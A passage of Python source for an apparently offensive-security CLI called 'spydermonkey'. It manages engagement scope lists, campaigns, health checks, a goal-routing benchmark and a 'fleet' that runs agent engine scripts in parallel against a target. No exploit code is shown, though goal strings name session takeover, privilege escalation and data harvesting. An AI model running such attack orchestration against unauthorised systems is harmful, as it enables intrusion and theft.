                print("· no scope authority — init: spydermonkey scope init")
            return 0
        if _json_mode(args):
            _emit(args, {"scope": scope, "summary": sa.summary(scope)})
        else:
            print(json.dumps(scope, indent=2))
            s = sa.summary(scope)
            print(f"\n  {s['engagement']}: {s['in_scope']} allow / {s['out_of_scope']} deny"
                  f" · max {s['rules'].get('max_rate_rps', '?')} rps"
                  + (" · EXPIRED" if s["expired"] else ""))
        return 0
    if action in ("add", "remove"):
        values = _split_values(args.value)
        if not values:
            raise UsageError(f"scope {action} needs --value (comma-separated)")
        kind = "out_of_scope" if args.kind in ("out", "out_of_scope", "deny") else "in_scope"

        def mutate(scope):
            if action == "add":
                for v in values:
                    if v not in scope[kind]:
                        scope[kind].append(v)
            else:
                scope[kind] = [x for x in scope[kind] if x not in values]

        try:
            scope = sa.update_scope(mutate, f)
        except sa.ScopeError as e:
            print(f"✗ {e}", file=sys.stderr)
            return 1
        payload = {"action": action, "kind": kind, "values": values,
                   "summary": sa.summary(scope)}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ scope {action}: {kind} {values}")
            print(f"  {scope['engagement']}: {len(scope['in_scope'])} allow /"
                  f" {len(scope['out_of_scope'])} deny")
        return 0
    if action == "extend":
        if not args.expires and not args.expires_days:
            raise UsageError("scope extend needs --expires ISO or --expires-days N")
        expires = args.expires
        if args.expires_days:
            from datetime import timedelta
            expires = (datetime.now(timezone.utc)
                       + timedelta(days=args.expires_days)).isoformat()

        def mutate(scope):
            scope["expires"] = expires

        try:
            scope = sa.update_scope(mutate, f)
        except sa.ScopeError as e:
            print(f"✗ {e}", file=sys.stderr)
            return 1
        if _json_mode(args):
            _emit(args, {"expires": expires, "scope": scope})
        else:
            print(f"▸ scope authority extended to {expires}")
        return 0
    return 2


def _campaign_dirs() -> list[Path]:
    root = _campaigns_root()
    if not root.exists():
        return []
    out = []
    for d in sorted(root.iterdir()):
        if not d.is_dir():
            continue
        try:
            sa.safe_name(d.name, "campaign")
        except sa.ScopeError:
            continue
        out.append(d)
    return out


def _campaign_summary(d: Path) -> dict:
    m = _load_json(d / "manifest.json", {})
    try:
        rows = _ledger_load(d.name)
    except Exception:
        rows = []
    try:
        board = _phase_board(d.name)
    except Exception:
        board = []
    done = sum(1 for r in board if r.get("status") == "completed")
    events = 0
    ev = d / "events.jsonl"
    if ev.exists():
        events = sum(1 for line in ev.read_text(errors="replace").splitlines()
                     if line.strip())
    states = sorted(p.name for p in d.glob("*state*.json"))
    return {
        "target": d.name,
        "path": str(d),
        "engagement": m.get("engagement", ""),
        "objective": m.get("objective", ""),
        "url": m.get("url", ""),
        "domain": m.get("domain", ""),
        "status": m.get("status", "open"),
        "created": m.get("created", ""),
        "updated": m.get("updated", ""),
        "ledger_rows": len(rows),
        "confirmed": sum(1 for r in rows if r.get("status") == "CONFIRMED"),
        "phases_complete": done,
        "phases_total": len(board),
        "events": events,
        "state_files": states,
    }


def cmd_campaign(args):
    action = args.action
    if action == "init":
        if not args.target:
            raise UsageError("campaign init needs --target")
        camp = _camp(args.target)
        exists = (camp / "manifest.json").exists()
        if exists and not getattr(args, "force", False):
            raise UsageError(f"campaign '{args.target}' already exists (use --force to update it)")
        scope = _load_scope()
        engagement = getattr(args, "engagement", None) or (scope or {}).get("engagement", "")
        data = {
            "engagement": engagement,
            "url": args.url or "",
            "domain": args.domain or "",
            "objective": args.objective or "",
            "status": "open",
            "created": _now(),
        }
        if exists and getattr(args, "force", False):
            old = _manifest(args.target)
            old.update({k: v for k, v in data.items() if v or k in ("created", "status")})
            data = old
        _save_manifest(args.target, data)
        _event(args.target, "campaign.init" if not exists else "campaign.reinit",
               args.objective or "engagement opened")
        payload = {"campaign": _campaign_summary(camp), "created": not exists}
        if _json_mode(args):
            _emit(args, payload)
        else:
            verb = "opened" if not exists else "updated"
            print(f"▸ campaign {verb}: '{args.target}'")
            print(f"  engagement: {engagement or '—'} · objective: {args.objective or '—'}")
            print(f"  path: {camp}")
        return 0
    if action == "list":
        rows = [_campaign_summary(d) for d in _campaign_dirs()]
        payload = {"campaigns": rows, "count": len(rows),
                   "root": str(_campaigns_root())}
        if _json_mode(args):
            _emit(args, payload)
        elif not rows:
            print("· no campaigns yet — campaign init --target <name>")
        else:
            print(f"═══ CAMPAIGNS — {len(rows)} engagement(s) ═══")
            for r in rows:
                print(f"  ▸ {r['target']:24s} [{r['status']:6s}]"
                      f" {r['ledger_rows']:3d} finding(s) ·"
                      f" {r['phases_complete']}/{r['phases_total'] or 13} phases"
                      f" · {r['objective'][:48] or '—'}")
            print(f"  root: {payload['root']}")
        return 0
    if action == "show":
        if not args.target:
            raise UsageError("campaign show needs --target")
        camp = _camp(args.target, create=False)
        if not camp.exists() or (not (camp / "manifest.json").exists()
                                 and not any(camp.iterdir())):
            print(f"✗ no campaign '{args.target}'", file=sys.stderr)
            return 2
        _ensure_campaign(args.target)
        rows = _ledger_load(args.target)
        payload = {
            "campaign": _campaign_summary(camp),
            "manifest": _manifest(args.target),
            "states": sorted(p.name for p in camp.glob("*state*.json")),
            "ledger": _ledger_stats(rows),
            "ledger_integrity": _ledger_integrity_details(args.target),
            "phases": _phase_board(args.target),
            "events_tail": _load_events(args.target, 10),
        }
        if _json_mode(args):
            _emit(args, payload)
        else:
            c = payload["campaign"]
            print(f"═══ CAMPAIGN — {args.target} ═══")
            print(f"  status:    {c['status']} · engagement: {c['engagement'] or '—'}")
            print(f"  objective: {c['objective'] or '—'}")
            print(f"  url:       {c['url'] or '—'} · domain: {c['domain'] or '—'}")
            print(f"  created:   {c['created']} · updated: {c['updated']}")
            print(f"  findings:  {c['ledger_rows']} ({c['confirmed']} confirmed)"
                  f" · phases {c['phases_complete']}/{c['phases_total'] or 13}")
            print(f"  states:    {', '.join(payload['states']) or 'none'}")
            print(f"  ledger:    {'signed chain ✓' if not payload['ledger_integrity']['errors'] else 'integrity ✗'}")
        return 0
    if action == "timeline":
        if not args.target:
            raise UsageError("campaign timeline needs --target")
        _camp(args.target)
        rows = _load_events(args.target, getattr(args, "limit", 100) or 100)
        payload = {"target": args.target, "events": rows, "count": len(rows)}
        if _json_mode(args):
            _emit(args, payload)
        elif not rows:
            print("· no campaign events yet")
        else:
            print(f"═══ CAMPAIGN TIMELINE — {args.target} ({len(rows)}) ═══")
            for r in rows:
                print(f"  {str(r.get('at', ''))[:19]}  {str(r.get('kind', '?')):24s}"
                      f" {str(r.get('detail', ''))[:76]}")
        return 0
    if action == "archive":
        if not args.target:
            raise UsageError("campaign archive needs --target")
        camp = _camp(args.target)
        if not camp.exists() or not any(camp.iterdir()):
            print(f"✗ no campaign '{args.target}'", file=sys.stderr)
            return 2
        arch = _root() / "archives"
        arch.mkdir(parents=True, exist_ok=True)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        out = arch / f"{sa.safe_name(args.target)}-{stamp}.tar.gz"
        with tarfile.open(out, "w:gz") as tf:
            tf.add(camp, arcname=camp.name)
        os.chmod(out, 0o600)
        removed = False
        if getattr(args, "remove", False):
            if not getattr(args, "force", False):
                raise UsageError("campaign archive --remove also needs --force")
            shutil.rmtree(camp)
            removed = True
            _audit_campaign(args.target, "archive+remove", str(out))
        payload = {"target": args.target, "archive": str(out),
                   "bytes": out.stat().st_size, "removed": removed}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ campaign archived: {out} ({out.stat().st_size} bytes)"
                  + (" · source removed" if removed else " · source kept"))
        return 0
    if action == "purge":
        if not args.target:
            raise UsageError("campaign purge needs --target")
        if not getattr(args, "force", False):
            raise UsageError("campaign purge is destructive — add --force")
        camp = _camp(args.target, create=False)
        root = _campaigns_root().resolve()
        try:
            camp.resolve().relative_to(root)
        except ValueError:
            raise UsageError("refusing to purge a path outside the campaigns root")
        if not camp.exists():
            print(f"✗ no campaign '{args.target}'", file=sys.stderr)
            return 2
        shutil.rmtree(camp)
        _audit_campaign(args.target, "purge", "operator --force")
        if _json_mode(args):
            _emit(args, {"target": args.target, "purged": True})
        else:
            print(f"▸ campaign purged: '{args.target}' (audit recorded)")
        return 0
    if action == "close":
        if not args.target:
            raise UsageError("campaign close needs --target")
        _ensure_campaign(args.target)
        m = _manifest(args.target)
        m["status"] = "closed"
        m["closed"] = _now()
        if getattr(args, "note", None):
            m["close_note"] = args.note
        _save_manifest(args.target, m)
        _event(args.target, "campaign.close", args.note or "engagement closed")
        if _json_mode(args):
            _emit(args, {"target": args.target, "status": "closed",
                         "manifest": m})
        else:
            print(f"▸ campaign closed: '{args.target}'"
                  + (f" — {args.note}" if getattr(args, 'note', None) else ""))
        return 0
    return 2


def _load_events(target: str, limit: int = 100) -> list[dict]:
    p = _camp(target) / "events.jsonl"
    if not p.exists():
        return []
    rows = []
    for line in p.read_text(errors="replace").splitlines():
        if not line.strip():
            continue
        try:
            row = json.loads(line)
            if isinstance(row, dict):
                rows.append(row)
        except Exception:
            continue
    return rows[-limit:]


def _audit_campaign(target: str, action: str, detail: str) -> None:
    try:
        row = {"at": _now(), "target": target, "action": action, "detail": detail}
        p = _root() / "campaign-audit.jsonl"
        p.parent.mkdir(parents=True, exist_ok=True)
        with p.open("a") as f:
            f.write(json.dumps(row) + "\n")
        try:
            os.chmod(p, 0o600)
        except OSError:
            pass
    except OSError:
        pass


def _iter_json_files(root: Path):
    for p in root.glob("*.json"):
        yield p


def _doctor_scope(fix: bool = False) -> dict:
    path = sa.scope_path()
    if not path.exists():
        return {"ok": True, "warning": "no scope authority (scope init recommended)",
                "path": str(path)}
    try:
        scope = sa.load_scope()
    except sa.ScopeError as e:
        return {"ok": False, "error": str(e), "path": str(path)}
    s = sa.summary(scope)
    problems, warnings = [], []
    if s["expired"]:
        problems.append(f"expired at {s['expires']}")
    mode = oct(path.stat().st_mode & 0o777)
    if mode != "0o600":
        if fix:
            try:
                path.chmod(0o600)
                warnings.append(f"scope permissions tightened {mode} → 0o600")
                mode = "0o600"
            except OSError as e:
                problems.append(f"mode {mode} (expected 0o600; chmod failed: {e})")
        else:
            problems.append(f"mode {mode} (expected 0o600; run doctor --fix)")
    return {"ok": not problems, "path": str(path), "summary": s,
            "problems": problems, "warnings": warnings}


def _doctor_campaigns(fix: bool = False) -> dict:
    out = {"campaigns": [], "errors": [], "warnings": [], "ledger_rows": 0}
    for d in _campaign_dirs():
        entry = {"target": d.name, "json_files": 0, "corrupt": [],
                 "ledger_rows": 0, "integrity": [], "events": 0}
        for p in _iter_json_files(d):
            entry["json_files"] += 1
            try:
                json.loads(p.read_text())
            except Exception as e:
                entry["corrupt"].append({"file": p.name, "error": str(e)[:160]})
                out["errors"].append(f"{d.name}/{p.name}: {e}")
                if fix:
                    try:
                        p.rename(p.with_name(p.name + f".corrupt-{int(time.time())}"))
                    except OSError:
                        pass
        rows = _ledger_load(d.name)
        entry["ledger_rows"] = len(rows)
        out["ledger_rows"] += len(rows)
        entry["integrity"] = _ledger_integrity(d.name)
        for e in entry["integrity"]:
            out["errors"].append(f"{d.name}/ledger: {e}")
        ev = d / "events.jsonl"
        if ev.exists():
            entry["events"] = sum(1 for l in ev.read_text(errors="replace").splitlines()
                                  if l.strip())
        for tmp in list(d.glob("*.tmp.*")):
            out["warnings"].append(f"{d.name}/{tmp.name}: stale temp file")
            if fix:
                try:
                    tmp.unlink()
                except OSError:
                    pass
        out["campaigns"].append(entry)
    return out


def _doctor_skilltree() -> dict:
    root = Path(__file__).resolve().parent.parent
    idx = root / "references" / "skilltree-index.md"
    skills = root / "references" / "skills"
    if not idx.exists():
        return {"ok": False, "error": "references/skilltree-index.md missing"}
    text = idx.read_text(errors="replace")
    links = re.findall(r"\]\((skills/[^)]+\.md)\)", text)
    missing = [l for l in links if not (root / "references" / l).exists()]
    files = list(skills.rglob("*.md")) if skills.exists() else []
    return {"ok": not missing, "index_links": len(links), "files": len(files),
            "missing": missing[:20],
            "error": f"{len(missing)} broken link(s)" if missing else ""}


def _doctor_relays() -> dict:
    rd = _root() / "relays"
    if not rd.exists():
        return {"ok": True, "nodes": []}
    nodes, problems = [], []
    for f in sorted(rd.glob("*/relay.json")):
        try:
            r = json.loads(f.read_text())
            nodes.append({"name": r.get("name"), "host": r.get("host")})
        except Exception as e:
            problems.append(f"{f}: {e}")
            continue
        key = Path(r.get("key", ""))
        if not key.exists():
            problems.append(f"{f.parent.name}: key missing ({key})")
        else:
            mode = oct(key.stat().st_mode & 0o777)
            if mode != "0o600":
                problems.append(f"{f.parent.name}: key mode {mode} (expected 0o600)")
    return {"ok": not problems, "nodes": nodes, "problems": problems}


def _doctor_compile() -> dict:
    scripts = [Path(__file__).resolve()] + [
        Path(__file__).resolve().parent / n
        for n in ("arsenal.py", "bench_live.py", "mcp_server.py",
                  "skilltree.py", "scope_authority.py")]
    bad = []
    for p in scripts:
        r = subprocess.run([sys.executable, "-m", "py_compile", str(p)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            bad.append(f"{p.name}: {r.stderr.strip()[:160]}")
    return {"ok": not bad, "scripts": len(scripts), "errors": bad}


def _doctor_mcp() -> dict:
    p = Path(__file__).resolve().parent / "mcp_server.py"
    try:
        r = subprocess.run([sys.executable, str(p), "--test"],
                           capture_output=True, text=True, timeout=20)
        if r.returncode != 0:
            return {"ok": False, "error": (r.stderr or r.stdout)[:200]}
        data = json.loads(r.stdout)
        return {"ok": True, "tools": len(data.get("tools", [])),
                "version": data.get("version", "?")}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}


def cmd_doctor(args):
    import platform
    checks = {}
    errors, warnings = [], []
    pv = platform.python_version()
    py_ok = tuple(map(int, pv.split(".")[:2])) >= (3, 8)
    checks["python"] = {"ok": py_ok, "version": pv}
    if not py_ok:
        errors.append(f"python {pv} < 3.8")

    checks["compile"] = _doctor_compile()
    if not checks["compile"]["ok"]:
        errors.extend(checks["compile"]["errors"])

    engines = _engine_status_all(fast=getattr(args, "fast", False))
    checks["engines"] = {
        "ok": all(e["ok"] for e in engines),
        "up": sum(1 for e in engines if e["ok"]), "total": len(engines),
        "items": engines,
    }
    if not checks["engines"]["ok"]:
        errors.extend(f"engine {e['name']}: {e['first']}" for e in engines if not e["ok"])

    checks["scope"] = _doctor_scope(fix=getattr(args, "fix", False))
    if not checks["scope"]["ok"]:
        errors.append("scope: " + "; ".join(checks["scope"].get("problems", [])
                                            or [checks["scope"].get("error", "invalid")]))
    if checks["scope"].get("warning"):
        warnings.append(checks["scope"]["warning"])
    warnings.extend(checks["scope"].get("warnings", []))

    checks["campaigns"] = _doctor_campaigns(fix=getattr(args, "fix", False))
    errors.extend(checks["campaigns"]["errors"])
    warnings.extend(checks["campaigns"]["warnings"])

    checks["skilltree"] = _doctor_skilltree()
    if not checks["skilltree"]["ok"]:
        errors.append("skilltree: " + checks["skilltree"].get("error", "broken"))

    checks["relays"] = _doctor_relays()
    if not checks["relays"]["ok"]:
        errors.extend(checks["relays"]["problems"])

    checks["mcp"] = _doctor_mcp()
    if not checks["mcp"]["ok"]:
        errors.append("mcp: " + checks["mcp"].get("error", "failed"))

    lv = _root() / "learned-vectors.jsonl"
    canon = 0
    canon_bad = 0
    if lv.exists():
        for line in lv.read_text(errors="replace").splitlines():
            if not line.strip():
                continue
            canon += 1
            try:
                json.loads(line)
            except Exception:
                canon_bad += 1
    checks["canon"] = {"ok": canon_bad == 0, "rows": canon, "corrupt": canon_bad}
    if canon_bad:
        errors.append(f"canon: {canon_bad} corrupt learned-vector row(s)")

    try:
        du = shutil.disk_usage(_root() if _root().exists() else Path.home())
        checks["disk"] = {"ok": du.free > 512 * 1024 * 1024,
                          "free_gb": round(du.free / (1024 ** 3), 2),
                          "total_gb": round(du.total / (1024 ** 3), 2)}
        if not checks["disk"]["ok"]:
            warnings.append(f"low disk: {checks['disk']['free_gb']} GB free")
    except OSError:
        checks["disk"] = {"ok": True, "error": "unavailable"}

    payload = {"version": VERSION, "ok": not errors, "errors": errors,
               "warnings": warnings, "checks": checks}
    if _json_mode(args):
        _emit(args, payload)
    else:
        print("═══ SPYDERMONKEY DOCTOR ═══")
        print(f"  python:    {pv} {'✓' if py_ok else '✗'}")
        print(f"  compile:   {checks['compile']['scripts']} script(s) "
              f"{'✓' if checks['compile']['ok'] else '✗'}")
        eng = checks["engines"]
        print(f"  engines:   {eng['up']}/{eng['total']} up {'✓' if eng['ok'] else '✗'}")
        s = checks["scope"]
        if s.get("summary"):
            print(f"  scope:     '{s['summary']['engagement']}'"
                  f" in={s['summary']['in_scope']} out={s['summary']['out_of_scope']}"
                  f" {'✓' if s['ok'] else '✗'}")
        else:
            print(f"  scope:     {'no authority (recommended: scope init)'}")
        c = checks["campaigns"]
        print(f"  campaigns: {len(c['campaigns'])} dir(s) · {c['ledger_rows']} ledger row(s)")
        for e in c["campaigns"]:
            if e["corrupt"] or e["integrity"]:
                print(f"    ✗ {e['target']}: {len(e['corrupt'])} corrupt ·"
                      f" {len(e['integrity'])} ledger issue(s)")
        st = checks["skilltree"]
        print(f"  skilltree: {st.get('files', 0)} file(s) · {st.get('index_links', 0)} index link(s)"
              f" {'✓' if st['ok'] else '✗'}")
        print(f"  canon:     {checks['canon']['rows']} learned-vector row(s)"
              f" {'✓' if checks['canon']['ok'] else '✗'}")
        print(f"  relays:    {len(checks['relays'].get('nodes', []))} node(s)"
              f" {'✓' if checks['relays']['ok'] else '✗'}")
        print(f"  mcp:       {checks['mcp'].get('tools', 0)} tool(s)"
              f" {'✓' if checks['mcp']['ok'] else '✗'}")
        print(f"  disk:      {checks['disk'].get('free_gb', '?')} GB free")
        for w in warnings:
            print(f"  ⚠ {w}")
        for e in errors:
            print(f"  ✗ {e}")
        print(f"═══ {'HEALTHY' if not errors else 'ATTENTION NEEDED'} ═══")
    return 0 if not errors else 1


# canned route-level benchmark: goal → expected mandate sequence (first mandate)
BENCH_CASES = [
    ("protect my opsec", "barbican"),
    ("check my vantage before anything", "barbican"),
    ("recon the domain", "holyshit"),
    ("what do we know in the case canon", "holyshit"),
    ("their custom bundle logic", "undercroft"),
    ("probe the api and jwt surface", "undercroft"),
    ("take over the session", "3am"),
    ("attack and exploit the login", "3am"),
    ("forge weapons from findings", "kairo"),
    ("synthesize chains from the vectors", "kairo"),
    ("climb the ladder on the host", "kaisha"),
    ("privesc and move lateral", "kaisha"),
    ("price what they could take", "shukaku"),
    ("harvest and disclose the crown jewels", "shukaku"),
    ("full assault everything", "shiki"),
    ("conduct the whole war in one command", "shiki"),
    ("detect the intrusion and write the rule", "kage"),
    ("blue team sigma detection", "kage"),
    ("train on a vulnerable replica in the lab", "dojo"),
    ("practice the lesson on the range", "dojo"),
    ("run the 3-gate confirm on the probe", "spy"),
    ("triage the finding ledger", "spy"),
    ("scan with nmap and nuclei", "arsenal"),
    ("subdomain enum with the tools", "arsenal"),
    ("zzz unmapped goal qqq", "barbican"),  # relay head
]

BENCH_SEQUENCES = [
    ("recon the domain then attack the session", ["holyshit", "3am"]),
    ("protect my opsec and recon", ["barbican", "holyshit"]),
    ("find the api and forge weapons", ["holyshit", "undercroft", "kairo"]),
    ("detect the intrusion then train on a replica", ["kage", "dojo"]),
]


def cmd_bench(args):
    results = []
    hits = 0
    for goal, want in BENCH_CASES:
        r = _route_goal(goal)
        got = r["primary"]
        ok = got == want
        hits += ok
        results.append({"goal": goal, "want": want, "got": got,
                        "sequence": r["sequence"], "ok": ok})
    seq_hits = 0
    for goal, want in BENCH_SEQUENCES:
        r = _route_goal(goal)
        ok = all(m in r["sequence"] for m in want)
        seq_hits += ok
        results.append({"goal": goal, "want_sequence": want,
                        "sequence": r["sequence"], "ok": ok})
    total = len(BENCH_CASES) + len(BENCH_SEQUENCES)
    passed = hits + seq_hits
    pct = 100.0 * passed / total
    payload = {"passed": passed, "total": total, "accuracy": round(pct, 1),
               "route_hits": hits, "route_total": len(BENCH_CASES),
               "sequence_hits": seq_hits, "sequence_total": len(BENCH_SEQUENCES),
               "results": results, "ok": pct >= 90}
    if _json_mode(args):
        _emit(args, payload)
    else:
        print("═══ SPYDERMONKEY BENCH (offline, route-level) ═══")
        for r in results:
            mark = "✓" if r["ok"] else "✗"
            if "want_sequence" in r:
                print(f"  {mark} '{r['goal'][:38]}' → {' → '.join(r['sequence'])}"
                      f" (want all of {r['want_sequence']})")
            else:
                print(f"  {mark} '{r['goal'][:38]}' → {r['got']} (want {r['want']})")
        print(f"═══ route accuracy: {passed}/{total} = {pct:.1f}%"
              f" ({hits}/{len(BENCH_CASES)} first-hop · {seq_hits}/{len(BENCH_SEQUENCES)} sequence) ═══")
        print("  (route-level only — see bench_live.py for the exploitation-level bench)")
    return 0 if pct >= 90 else 1


def cmd_foundation(args):
    fpath = (Path(__file__).resolve().parent.parent / "references"
             / "foundation.md")
    if args.file:
        print(str(fpath))
        return 0
    print(fpath.read_text())
    return 0


def cmd_mandate(args):
    if getattr(args, "pack", False):
        pfile = Path(__file__).resolve().parent.parent / "references" / "mandate-pack.md"
        if args.file:
            print(str(pfile))
            return 0
        print(pfile.read_text())
        return 0
    if getattr(args, "session", False):
        sfile = Path(__file__).resolve().parent.parent / "references" / "mandate-session.md"
        if args.file:
            print(str(sfile))
            return 0
        print(sfile.read_text())
        return 0
    mfile = Path(__file__).resolve().parent.parent / "references" / "mandate.md"
    if args.file:
        print(str(mfile))
        return 0
    print(mfile.read_text())
    return 0


MANDATE_SECTIONS = ("axis", "law", "handoff", "evidence", "fleet", "failure")


def _mandate_contract_path(name: str) -> Path:
    meta = MANDATES.get(name)
    if not meta:
        raise UsageError(f"unknown mandate '{name}' (one of: {', '.join(MANDATES)})")
    return Path(__file__).resolve().parent.parent / "references" / "mandates" / meta["contract"]


def cmd_mandates(args):
    action = args.action
    if action == "list":
        rows = []
        for name, meta in MANDATES.items():
            p = _mandate_contract_path(name)
            rows.append({"name": name, "n": meta["n"], "role": meta["role"],
                         "axis": meta["axis"], "phase": meta["phase"],
                         "contract": meta["contract"], "contract_path": str(p),
                         "present": p.exists()})
        payload = {"mandates": rows, "count": len(rows),
                   "complete": all(r["present"] for r in rows)}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ MANDATE CONTRACTS — {len(rows)} contracts ═══")
            for r in rows:
                print(f"  {'✓' if r['present'] else '✗'} {r['n']} {r['name']:10s}"
                      f" {r['role']:16s} phase={r['phase']:22s} {r['contract']}")
        return 0
    if action == "show":
        if not args.name:
            raise UsageError("mandates show needs --name")
        name = args.name.lower()
        meta = MANDATES.get(name)
        if not meta:
            raise UsageError(f"unknown mandate '{args.name}'")
        p = _mandate_contract_path(name)
        text = p.read_text() if p.exists() else ""
        payload = {"name": name, **meta, "contract_path": str(p),
                   "present": p.exists(), "content": text}
        if _json_mode(args):
            _emit(args, payload)
        elif not p.exists():
            print(f"✗ contract missing: {p}", file=sys.stderr)
            return 2
        else:
            print(text)
        return 0 if p.exists() else 2
    if action == "verify":
        errors, warnings = [], []
        if len(MANDATES) != 10:
            errors.append(f"{len(MANDATES)} mandates registered (expected 10)")
        nums = sorted(m["n"] for m in MANDATES.values())
        if nums != list(range(10)):
            errors.append(f"mandate numbering is not 0..9: {nums}")
        for name, meta in MANDATES.items():
            p = _mandate_contract_path(name)
            if not p.exists():
                errors.append(f"{name}: contract missing ({p})")
                continue
            text = p.read_text(errors="replace").lower()
            missing = [s for s in MANDATE_SECTIONS if f"## {s}" not in text]
            if missing:
                errors.append(f"{name}: contract missing section(s): {', '.join(missing)}")
            if name.split("-")[0] not in text:
                warnings.append(f"{name}: contract does not name the mandate")
            if meta["phase"] not in {p["id"] for p in PHASES}:
                errors.append(f"{name}: unknown phase '{meta['phase']}'")
        payload = {"ok": not errors, "errors": errors, "warnings": warnings,
                   "count": len(MANDATES)}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ MANDATE CONTRACT VERIFY — {len(MANDATES)} contracts ═══")
            for e in errors:
                print(f"  ✗ {e}")
            for w in warnings:
                print(f"  ⚠ {w}")
            print(f"═══ {'ALL CONTRACTS VALID' if not errors else 'CONTRACT ERRORS'} ═══")
        return 0 if not errors else 1
    return 2


# ── v1.4.0 the agent fleet · v4 real briefs + plan + state ───────────────────

FLEET_BRIEFS = {name: (meta["role"], meta["fleet"])
                for name, meta in MANDATES.items()}


def _clean_out(text: str, limit: int = 20000) -> str:
    text = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text or "")
    return text[:limit]


def _fleet_seq(goal: str, agents: str | None) -> list[str]:
    routed = _route_goal(goal)
    matched = [m for m in routed["sequence"] if m in FAMILY]
    seq = list(dict.fromkeys(matched + list(RELAY)))
    if agents:
        want = [s.strip() for s in agents.split(",") if s.strip()]
        unknown = [w for w in want if w not in FAMILY]
        if unknown:
            raise UsageError(f"unknown agent(s): {', '.join(unknown)}")
        seq = [m for m in seq if m in want]
    return seq


def _fleet_plan(seq: list[str], ctx: dict) -> list[dict]:
    plan = []
    for name in seq:
        role, brief = FLEET_BRIEFS[name]
        script = FAMILY[name][0]
        try:
            args = [a.format(**ctx) for a in brief]
        except KeyError as e:
            args = list(brief)
            plan.append({"agent": name, "role": role, "error": f"bad brief {e}"})
            continue
        plan.append({"agent": name, "role": role, "engine": str(script),
                     "present": script.exists(), "argv": args,
                     "command": " ".join([str(script)] + args)})
    return plan


def cmd_fleet(args):
    """PARALLEL MULTI-AGENT DISPATCH: every mandate wakes as its own agent with
    its real engine brief, runs its capability pass, and the fleet reports."""
    _camp(args.target)
    _ensure_campaign(args.target, domain=args.domain, objective=args.goal)
    seq = _fleet_seq(args.goal, args.agents)
    ctx = {"target": args.target, "domain": args.domain}
    plan = _fleet_plan(seq, ctx)
    # THE SQUAD BRIEFS (v7.4 — rails closed): every dispatched agent gets a
    # brief file = one-paste pack + walls + lane-specific retrieval knowledge.
    # Path rides in SPYDERMONKEY_BRIEF; the briefs are artifacts any agent or
    # reviewer reads. No model needed — composition is deterministic policy.
    pack_path = (Path(__file__).resolve().parent.parent
                 / "references" / "mandate-pack.md")
    pack_text = pack_path.read_text() if pack_path.exists() else ""
    brief_root = _camp(args.target) / "fleet"
    brief_root.mkdir(parents=True, exist_ok=True)
    brief_paths = {}
    for name in seq:
        role, _ = FLEET_BRIEFS[name]
        knowledge = cr.query(" ".join([args.goal or "", role, name]),
                             top=4, budget=2400)
        know_txt = "\n".join(
            f"[{h['kind']}] {h['title']} — {h['id']}"
            + (f"\n    {h['snippet'][:160]}" if h["snippet"] else "")
            for h in knowledge) or "(none yet — run crawl / discover first)"
        brief = (f"# FLEET AGENT BRIEF — {name} · {role}\n\n"
                 f"TARGET: {args.target} · DOMAIN: {args.domain or '-'} · "
                 f"GOAL: {args.goal}\n\n"
                 f"WALLS: {WALLS_ONELINER}\n\n"
                 f"## The one-paste pack (persona + rails)\n{pack_text}\n\n"
                 f"## Lane knowledge (retrieval, deterministic)\n{know_txt}\n")
        path = brief_root / f"{name}.brief.md"
        path.write_text(brief)
        brief_paths[name] = str(path)
    if getattr(args, "dry_run", False):
        payload = {"goal": args.goal, "target": args.target, "domain": args.domain,
                   "plan": plan, "executed": False}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ SPYDERMONKEY FLEET PLAN — {len(plan)} agent(s), nothing executes ═══")
            for p in plan:
                mark = "✓" if p.get("present") else "✗"
                print(f"  {mark} {p['agent']:10s} {p['role']:16s} {p.get('command', '')[:110]}")
        return 0
    if _json_mode(args):
        # JSON mode still executes, then emits one structured document.
        pass
    else:
        mode = "SEQUENTIAL" if getattr(args, "sequential", False) else "PARALLEL"
        print(f"═══ SPYDERMONKEY FLEET — {len(seq)} agent(s) dispatching {mode} ═══")
        print(f"  goal: '{args.goal}' · target: {args.target} · domain: {args.domain}")
    results = {}
    started = time.time()

    def agent(name):
        role, _ = FLEET_BRIEFS[name]
        script = FAMILY[name][0]
        plan_row = next((p for p in plan if p["agent"] == name), {})
        if not script.exists():
            results[name] = {"agent": name, "role": role, "ok": False, "rc": 1,
                             "output": f"engine missing — agent offline ({script})",
                             "elapsed": 0.0}
            return
        argv = [sys.executable, str(script)] + plan_row["argv"]
        env = {**os.environ, "SPYDERMONKEY_BRIEF": brief_paths.get(name, "")}
        t0 = time.time()
        out, rc = "", 1
        for attempt in range((getattr(args, "retries", 0) or 0) + 1):
            out, rc = _run(argv, timeout=getattr(args, "timeout", 45) or 45,
                           env=env)
            if rc == 0:
                break
        results[name] = {"agent": name, "role": role, "ok": rc == 0, "rc": rc,
                         "output": _clean_out(out),
                         "elapsed": round(time.time() - t0, 2),
                         "command": " ".join(argv)}

    if getattr(args, "sequential", False):
        for name in seq:
            agent(name)
    else:
        threads = [threading.Thread(target=agent, args=(m,), daemon=True) for m in seq]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    out_rows = []
    up = 0
    for name in seq:
        r = results.get(name, {"agent": name, "role": FLEET_BRIEFS[name][0],
                               "ok": False, "rc": 1, "output": "no result",
                               "elapsed": 0.0})
        up += r["ok"]
        lines = [l for l in r["output"].splitlines() if l.strip()]
        r["key_lines"] = lines[:8]
        out_rows.append(r)
        if not _json_mode(args):
            print(f"\n  ┌─ AGENT {name} — {r['role']} [{'✓' if r['ok'] else '✗'}]"
                  f" {r['elapsed']}s")
            for l in lines[:8]:
                print(f"  │ {l[:110]}")
            print(f"  └─ ({len(lines)} lines)")
    elapsed = round(time.time() - started, 2)
    payload = {"goal": args.goal, "target": args.target, "domain": args.domain,
               "agents": out_rows, "up": up, "total": len(seq),
               "elapsed": elapsed, "ok": up == len(seq)}
    try:
        st = _load_json(_camp(args.target) / "fleet-state.json", {"history": []})
        st.setdefault("history", []).append(
            {"at": _now(), "goal": args.goal, "up": up, "total": len(seq),
             "elapsed": elapsed, "agents": [{"agent": r["agent"], "ok": r["ok"],
